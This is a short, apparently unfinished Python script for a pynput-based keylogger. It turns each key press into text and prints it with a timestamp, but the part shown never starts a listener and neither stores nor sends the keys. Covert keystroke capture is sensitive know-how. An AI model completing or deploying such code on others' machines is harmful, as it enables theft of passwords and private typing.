import pynput
import datetime
import timing

log = ""
tiempos = timing.tiempos()


def append_to_log(string):
    global log 
    log = string
    print(log , "     " , str(datetime.datetime.today()))

def keylogger(key):
        try:
            otrokey = str(key.char)
        except AttributeError:
            if key == key.space:
                otrokey = " "
            else:
                otrokey= " " + str(key) + " " 
        append_to_log(otrokey)

tiempos.start()

